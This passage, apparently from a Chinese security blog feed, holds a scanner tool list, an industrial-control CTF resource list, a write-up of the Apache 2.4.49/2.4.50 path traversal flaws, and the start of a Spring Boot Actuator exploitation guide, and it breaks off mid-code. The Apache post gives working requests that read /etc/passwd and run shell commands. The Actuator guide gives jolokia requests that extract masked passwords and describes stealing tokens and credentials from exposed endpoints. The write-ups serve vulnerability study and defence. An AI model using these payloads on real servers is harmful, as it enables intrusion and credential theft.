Scanner)</li><li>riusksk/FlashScanner (flashxss扫描)</li><li>coffeehb/SSTIF （一个Fuzzing服务器端模板注入漏洞的半自动化工具）</li><li>epinna/tplmap (服务器端模板注入漏洞检测与利用工具)</li><li>cr0hn/dockerscan (docker扫描工具)</li></ul><h4 id="无线网络渗透、扫描"><a href="#无线网络渗透、扫描" class="headerlink" title="无线网络渗透、扫描#"></a>无线网络渗透、扫描#</h4><ul><li>savio-code/fern-wifi-cracker (无线安全审计工具)</li><li>m4n3dw0lf/PytheM （Python网络/渗透测试工具）</li><li>P0cL4bs/WiFi-Pumpkin （无线安全渗透测试套件）</li></ul><h4 id="代码静态扫描、代码运行栈跟踪"><a href="#代码静态扫描、代码运行栈跟踪" class="headerlink" title="代码静态扫描、代码运行栈跟踪#"></a>代码静态扫描、代码运行栈跟踪#</h4><ul><li>wufeifei/cobra (白盒代码安全审计系统)</li><li>OneSourceCat/phpvulhunter (静态php代码审计)</li><li>Qihoo360/phptrace (跟踪、分析PHP运行情况的工具）</li><li>ajinabraham/NodeJsScan (NodeJS应用代码审计）</li></ul><h4 id="模块化扫描、综合扫描器"><a href="#模块化扫描、综合扫描器" class="headerlink" title="模块化扫描、综合扫描器#"></a>模块化扫描、综合扫描器#</h4><ul><li>az0ne/AZScanner (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</li><li>blackye/lalascan (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)</li><li>blackye/BkScanner (BkScanner 分布式、插件化web漏洞扫描器)</li><li>ysrc/GourdScanV2 （被动式漏洞扫描)</li><li><a href="https://github.com/alpha1e0/pentestdb">https://github.com/alpha1e0/pentestdb</a> (WEB渗透测试数据库)</li><li>netxfly/passive_scan (基于http代理的web漏洞扫描器)</li><li>1N3/Sn1per (自动化扫描器，包括中间件扫描以及设备指纹识别)</li><li>RASSec/pentestEr_Fully-automatic-scanner （定向全自动化渗透测试工具）</li><li><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a> （自动化渗透测试框架)</li><li><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a> (扫描效果未验证）</li><li><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> （渗透测试插件化并发框架）</li><li><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> （Scanner in Python3.5 for SQLi/XSS/LFI/RFI and other Vulns）</li><li><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a> （web端的在线漏洞扫描）</li><li><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a> (开发中…)</li></ul><h4 id="APT"><a href="#APT" class="headerlink" title="APT#"></a>APT#</h4><ul><li><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a> (一款APT入侵痕迹扫描器)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介#&quot;&gt;&lt;/a&gt;简介#&lt;/h3&gt;&lt;p&gt;Scanners-Box是一个集合github平台上的安全行业从业人员自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>工控安全CTF入门小记</title>
    <link href="http://example.com/2021/11/18/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8CTF%E5%85%A5%E9%97%A8%E5%B0%8F%E8%AE%B0/"/>
    <id>http://example.com/2021/11/18/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8CTF%E5%85%A5%E9%97%A8%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-11-18T07:40:28.000Z</published>
    <updated>2021-12-14T07:45:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><p>工控安全入门分析</p><p><a href="https://www.anquanke.com/post/id/82383">https://www.anquanke.com/post/id/82383</a></p><p>工控安全基础概念初探</p><p><a href="http://blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/">http://blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/</a></p><p>ICS_CTF Contest</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/">https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/</a></p><p>工控安全-Freebuf</p><p><a href="https://search.freebuf.com/search/?search=%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8#article">https://search.freebuf.com/search/?search=%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8#article</a></p><p>工控安全系列文章</p><p><a href="https://www.anquanke.com/member/141205">https://www.anquanke.com/member/141205</a></p><p>深度解析工控网络流量特点</p><p><a href="https://www.freebuf.com/articles/ics-articles/167079.html">https://www.freebuf.com/articles/ics-articles/167079.html</a></p><p>工控CTF技能点学习总结</p><p><a href="https://zhuanlan.zhihu.com/p/93070821">https://zhuanlan.zhihu.com/p/93070821</a></p><p>Siemens PLC指纹提取方法汇总</p><p><a href="https://www.jianshu.com/p/75edadd2abbf">https://www.jianshu.com/p/75edadd2abbf</a></p><p>ZoomEye工控专题</p><p><a href="http://ics.zoomeye.org/">http://ics.zoomeye.org/</a></p><p>Fofa工控专题</p><p><a href="https://fofa.so/subject">https://fofa.so/subject</a></p><h3 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h3><p>纵横网络靶场社区</p><p><a href="https://game.fengtaisec.com/">https://game.fengtaisec.com</a></p><h3 id="历届比赛真题"><a href="#历届比赛真题" class="headerlink" title="历届比赛真题"></a>历届比赛真题</h3><p>包括2018工业信息安全大赛、2019工业信息安全大赛、2018护网杯等题目</p><p><a href="https://github.com/ddyy0308/CTF">https://github.com/ddyy0308/CTF</a></p><h3 id="相关分析与WriteUp"><a href="#相关分析与WriteUp" class="headerlink" title="相关分析与WriteUp"></a>相关分析与WriteUp</h3><p>CTF工业信息安全大赛实践与分析</p><p><a href="https://www.freebuf.com/articles/ics-articles/210687.html">https://www.freebuf.com/articles/ics-articles/210687.html</a></p><p>一道MMS工控协议CTF题的WriteUp</p><p><a href="https://blog.csdn.net/cn_lyxc/article/details/94832631">https://blog.csdn.net/cn_lyxc/article/details/94832631</a></p><p>2018工业信息安全技能大赛华东赛区初赛</p><p><a href="https://www.cnblogs.com/bianmu-dadan/p/9414165.html">https://www.cnblogs.com/bianmu-dadan/p/9414165.html</a></p><p>老题新招 | 再解工控CTF流量分析题</p><p><a href="https://www.freebuf.com/articles/ics-articles/176868.html">https://www.freebuf.com/articles/ics-articles/176868.html</a></p><p>2019工业信息安全竞赛部分</p><p><a href="https://www.dazhuanlan.com/2019/12/30/5e09dcd470284/">https://www.dazhuanlan.com/2019/12/30/5e09dcd470284/</a></p><p>2019 工业信息安全竞赛总结</p><p><a href="https://www.cnpanda.net/ctf/415.html">https://www.cnpanda.net/ctf/415.html</a></p><p>由一道工控路由器固件逆向题目看命令执行漏洞</p><p><a href="https://www.anquanke.com/post/id/183202#h3-10">https://www.anquanke.com/post/id/183202#h3-10</a></p><h3 id="一些工具脚本"><a href="#一些工具脚本" class="headerlink" title="一些工具脚本"></a>一些工具脚本</h3><p>工控CTF比赛工具，各种网络数据包处理脚本</p><p><a href="https://github.com/NewBee119/ctf_ics_traffic">https://github.com/NewBee119/ctf_ics_traffic</a></p><p>分析工控网络流量的工具</p><p><a href="https://github.com/NewBee119/ICS-packets-Analyzer">https://github.com/NewBee119/ICS-packets-Analyzer</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>一些好用的过滤条件</p><p>ip contains flag.txt</p><p>modbus&amp;&amp;modbus.func_code==16</p><p>s7comm&amp;&amp;s7comm.param.func==0x05</p><p>mms.confirmedServiceRequest==73</p><h3 id="规律"><a href="#规律" class="headerlink" title="规律"></a>规律</h3><p>mms协议有关的流量分析题目，可以先搜索flag，png等关键字符串，如果检索不到可以尝试搜索对应的十六进制，比如666c（’fl’）</p><p>找到fileopen（72）对应的No.</p><p>接着使用这一条mms.confirmedServiceRequest==73过滤fileread（73）操作的条目</p><p>观察那一条大于fileopen的No.</p><p>找到invokeID</p><p>接着找对应的mms.invokeID==No.</p><p>会发现mms.confirmed_ResponsePDU，这个的十六进制值就存在flag内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识库&quot;&gt;&lt;a href=&quot;#知识库&quot; class=&quot;headerlink&quot; title=&quot;知识库&quot;&gt;&lt;/a&gt;知识库&lt;/h3&gt;&lt;p&gt;工控安全入门分析&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/82383&quot;&gt;h</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache 2.4.49</title>
    <link href="http://example.com/2021/10/15/Apache-2-4-49/"/>
    <id>http://example.com/2021/10/15/Apache-2-4-49/</id>
    <published>2021-10-15T02:09:10.000Z</published>
    <updated>2022-12-06T09:07:32.218Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞描述</strong></p><p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p><p><strong>影响版本</strong></p><p>Apache HTTPd 2.4.49/2.4.50版本</p><p><strong>验证过程</strong></p><p>Apache HTTPd 2.4.49 任意文件读取漏洞验证：</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101123969.png" alt="image-20211015101123969"></p><p>GET数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><p>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101211618.png" alt="image-20211015101211618"></p><p>POST数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure><p>Apache HTTPd 2.4.50 命令执行测试：</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101238669.png" alt="image-20211015101238669"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure><p>一个图片总结这次ApacheHTTPd 2.4.50版本修复不完善。</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101302065.png" alt="image-20211015101302065"></p><p><strong>修复建议</strong></p><p>建议使用Apache HTTPd 2.4.49 与Apache HTTPd 2.4.50 版本的服务器更新Apache HTTPd 版本至最新。</p><p><strong>检测工具</strong></p><h2 id="Apache-2-4-49-CVE-2021-41773"><a href="#Apache-2-4-49-CVE-2021-41773" class="headerlink" title="Apache 2.4.49 (CVE-2021-41773)"></a>Apache 2.4.49 (CVE-2021-41773)</h2><h2 id="Apache-2-4-50-CVE-2021-42013"><a href="#Apache-2-4-50-CVE-2021-42013" class="headerlink" title="Apache 2.4.50 (CVE-2021-42013)"></a>Apache 2.4.50 (CVE-2021-42013)</h2><h2 id="批量多线程检测工具："><a href="#批量多线程检测工具：" class="headerlink" title="批量多线程检测工具："></a>批量多线程检测工具：</h2><p>Github地址：</p><p><a href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101457783.png" alt="image-20211015101457783"></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/df0e622806a60f52f351f30127ad7944.png" alt="df0e622806a60f52f351f30127ad7944"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Apache 2.4.49" scheme="http://example.com/tags/Apache-2-4-49/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuator未授权访问利用实战利用</title>
    <link href="http://example.com/2021/09/17/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2021/09/17/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/</id>
    <published>2021-09-17T10:39:53.000Z</published>
    <updated>2022-12-06T09:16:48.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Boot-集合"><a href="#Spring-Boot-集合" class="headerlink" title="Spring Boot 集合"></a><strong>Spring Boot 集合</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE</p><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p><h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210825221013561.png" alt="image-20210825221013561"></p><h3 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系"><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系"></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系</h3><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210825221109141.png" alt="image-20210825221109141"></p><h3 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义"></a>Spring Cloud 小版本号的后缀及含义</h3><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210825221154274.png" alt="image-20210825221154274"></p><p>[TOC]</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境准备：JDK 1.8 or later and Maven 3.2+</p><p>漏洞环境集合源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/18PSZvDxIRFwuNQBxo__4Ng </span><br><span class="line">提取码：jfzx </span><br></pre></td></tr></table></figure><p>下面是网盘中的资源包对应的命令执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">springboot-spel-rce包-------------------------------------命令执行2.1  </span><br><span class="line">springcloud-snakeyaml-rce包-------------------------------命令执行2.2</span><br><span class="line">actuator-testbed-master包---------------------------------命令执行2.3  2.4  2.5</span><br><span class="line">springboot-h2-database-rce包------------------------------命令执行2.6  2.8</span><br><span class="line">springboot-restart-rce包----------------------------------命令执行2.7  2.10 2.11 2.12</span><br><span class="line">springboot-mysql-jdbc-rce --------------------------------命令执行2.9</span><br><span class="line">maliciousRMIServer包包含RMI服务代码</span><br></pre></td></tr></table></figure><p>修改监听端口(不修改的话默认只能在搭建环境主机上访问)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/resources/application.properties server.address=0.0.0.0</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure><p>启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./target/xxxxxxxx.jar</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/a149799f8e8cf1d346efe3ee5649f3d1.png"></p><p>访问http:<em>//127.0.0.1:8090显示springboot欢迎页面</em></p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/733cfef5eb93509eee7b349f83def144.png"></p><p>当访问错误页面时，会提示错误信息</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/b84c0336ffa31a1c60da33c76f379659.png"></p><p>这里访问env就可以看到环境特性</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/0b00e02831d25ebd363910e0a85f6c16.png"></p><p>访问health显示应用的健康状态</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/e506922f3ff848db66817588eb0afe41.png"></p><h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><h3 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h3><h4 id="1-1-路由及接口调用详情泄露"><a href="#1-1-路由及接口调用详情泄露" class="headerlink" title="1.1.路由及接口调用详情泄露"></a>1.1.路由及接口调用详情泄露</h4><blockquote><p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p></blockquote><p>可以访问以下swagger相关路由进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure><p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p><p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞</p><p><strong>还有一些内置的端点路由由于未设置actuator访问控制暴露</strong></p><p>所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/33a5ec86aaddffe377ab51095d2b50db.png"></p><blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：</span><br><span class="line"></span><br><span class="line">Spring1.x与2.x在post请求方面也存在差异，</span><br><span class="line"></span><br><span class="line">1.x通过application/x-www-form-urlencoded 进行post请求，</span><br><span class="line"></span><br><span class="line">2.x通过传递json包请求的applistion/json</span><br></pre></td></tr></table></figure></blockquote><p>其中对寻找漏洞比较重要接口的有：</p><ul><li><p><code>/env</code>、<code>/actuator/env</code></p><p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p><p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p></li><li><p><code>/refresh</code>、<code>/actuator/refresh</code></p><p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p></li><li><p><code>/restart</code>、<code>/actuator/restart</code></p><p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p></li><li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p><p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p></li><li><p><code>/trace</code>、<code>/actuator/httptrace</code></p><p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p></li></ul><blockquote><p>除了上面一些端点路由，还有程序员自定义的根路径</p><ul><li>/manage、/management、项目APP相关名称</li><li>修改内置端点名字(如有些时候/env被程序员修改为/appenv)</li></ul></blockquote><h4 id="1-2-端点路由泄露导致敏感信息泄露"><a href="#1-2-端点路由泄露导致敏感信息泄露" class="headerlink" title="1.2.端点路由泄露导致敏感信息泄露"></a>1.2.端点路由泄露导致敏感信息泄露</h4><p><strong>认证字段的获取以证明可影响其他用户</strong></p><blockquote><p>这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator<br>配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP<br>头等），还有用户 token、cookie字段</p></blockquote><p>trace 路径：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/d50c0dccc7f6b5f4a461764a2f7065b4.png"></p><p>用户字段泄露:</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/561692caae82f0847bc116f9873e09d1.png"></p><p>通过替换 token 字段可获取其他用户的信息</p><p><strong>数据库账户密码泄露</strong></p><p>由于 actuator 会监控站点 mysql、mangodb<br>之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb<br>数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator<br>配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/db9fb7d5cba6a62bd56ea1cf07835469.png"></p><p><strong>Gitlab源代码泄露</strong></p><p>这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git<br>项目地址：</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/813b4e89bbaa2442f21e889e89be4d9c.png"></p><p><strong>后台用户账号密码泄露</strong></p><p>这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof<br>堆转储文件。在 Android studio<br>打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码</p><h4 id="1-3获取星号脱敏的密码明文"><a href="#1-3获取星号脱敏的密码明文" class="headerlink" title="1.3获取星号脱敏的密码明文"></a>1.3获取星号脱敏的密码明文</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li></ul><h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p><strong>步骤一:确定属性名</strong></p><p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p><p><strong>步骤二:jolokia 调用相关 Mbean</strong> </p><p>这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到</p><ul><li>调用 <code>org.springframework.boot</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><ul><li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 